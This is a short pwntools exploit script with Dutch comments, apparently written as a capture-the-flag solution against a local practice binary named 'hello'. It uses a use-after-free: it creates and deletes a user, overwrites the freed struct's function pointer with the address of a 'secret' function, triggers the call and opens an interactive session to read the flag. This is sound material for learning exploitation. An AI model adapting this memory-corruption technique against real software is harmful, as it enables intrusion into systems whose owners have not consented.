from pwn import *

context.binary = './hello'
context.log_level = 'error'

p = process('./hello')

# Stap 1: Create user
p.sendlineafter(b'> ', b'1')

# Stap 2: Delete user
p.sendlineafter(b'> ', b'2')

# Stap 3: Overwrite user struct directly (UAF)
secret_addr = 0x00000000004011b6  # â† check dit nog met `nm hello | grep secret`

payload = b"HACKED__" + p64(secret_addr)  # char* name, void (*func)(char*)

p.sendlineafter(b'> ', b'3')
p.sendafter(b'name: ', payload)

# Stap 4: Trigger call
p.sendlineafter(b'> ', b'4')

# Interactief om de FLAG te zien
p.interactive()
